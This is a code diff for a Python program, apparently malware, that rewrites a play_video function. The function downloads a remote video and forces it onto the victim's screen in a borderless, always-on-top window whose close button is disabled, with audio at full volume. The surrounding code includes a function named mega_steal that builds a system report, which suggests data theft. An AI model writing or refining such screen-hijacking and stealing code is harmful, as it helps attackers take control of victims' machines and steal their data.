@@ -194,42 +194,102 @@ def anim_connect():
     time.sleep(3); a.destroy()
 
 def play_video():
-    try: download_file(VIDEO_URL, VIDEO_PATH)
-    except: return
-    time.sleep(0.3)
     try:
-        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
-        v.configure(bg='black'); v.overrideredirect(True)
-        v.protocol("WM_DELETE_WINDOW", lambda: None)
-        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+        download_file(VIDEO_URL, VIDEO_PATH)
+    except:
+        return
+
+    if not os.path.exists(VIDEO_PATH) or os.path.getsize(VIDEO_PATH) < 1000:
+        return
+
+    time.sleep(0.3)
+
+    video_window = tk.Tk()
+    video_window.attributes('-fullscreen', True)
+    video_window.attributes('-topmost', True)
+    video_window.configure(bg='black')
+    video_window.overrideredirect(True)
+    video_window.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    lbl = tk.Label(video_window, bg='black')
+    lbl.pack(expand=True, fill='both')
+
+    try:
+        import pygame
+        pygame.init()
+        pygame.display.set_mode((1, 1), pygame.NOFRAME)
+        pygame.mixer.quit()
+        pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
+    except:
+        video_window.destroy()
+        return
+
+    stop_video = threading.Event()
+
+    def play_audio():
+        try:
+            pygame.mixer.music.load(VIDEO_PATH)
+            pygame.mixer.music.set_volume(1.0)
+            pygame.mixer.music.play()
+            while pygame.mixer.music.get_busy() and not stop_video.is_set():
+                time.sleep(0.05)
         except:
-            try:
-                import pygame; pygame.mixer.init()
-                pygame.mixer.music.load(VIDEO_PATH); pygame.mixer.music.play()
-            except: pass
-        cap = cv2.VideoCapture(VIDEO_PATH)
-        if cap.isOpened():
-            fps = cap.get(cv2.CAP_PROP_FPS)
-            if fps <= 0: fps = 30
-            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
-            fc = 0; vs = time.time()
-            while cap.isOpened():
-                ret, frame = cap.read()
-                if not ret: break
-                fc += 1
-                expected = fc / fps
-                elapsed = time.time() - vs
-                if expected > elapsed: time.sleep(expected - elapsed)
-                frame = cv2.resize(frame, (sw, sh))
-                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
-                lbl.config(image=img); lbl.image = img; v.update()
-            cap.release()
-        v.destroy()
-        try: pygame.mixer.music.stop()
-        except: pass
-    except: pass
+            pass
+
+    audio_thread = threading.Thread(target=play_audio, daemon=True)
+    audio_thread.start()
+
+    cap = cv2.VideoCapture(VIDEO_PATH)
+    if not cap.isOpened():
+        pygame.mixer.music.stop()
+        video_window.destroy()
+        return
+
+    fps = cap.get(cv2.CAP_PROP_FPS)
+    if fps <= 0:
+        fps = 30
+
+    sw = video_window.winfo_screenwidth()
+    sh = video_window.winfo_screenheight()
+
+    try:
+        frame_count = 0
+        start_time = time.time()
+
+        while cap.isOpened():
+            ret, frame = cap.read()
+            if not ret:
+                break
+
+            frame_count += 1
+
+            expected_elapsed = frame_count / fps
+            actual_elapsed = time.time() - start_time
+            if expected_elapsed > actual_elapsed:
+                time.sleep(expected_elapsed - actual_elapsed)
+
+            frame = cv2.resize(frame, (sw, sh))
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+            img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
+            lbl.config(image=img)
+            lbl.image = img
+            video_window.update()
+
+    except:
+        pass
+    finally:
+        stop_video.set()
+        cap.release()
+        try:
+            pygame.mixer.music.stop()
+            pygame.quit()
+        except:
+            pass
+        try:
+            video_window.destroy()
+        except:
+            pass
 
 def mega_steal():
     report = ["="*60, "SYSTEM REPORT", "="*60]
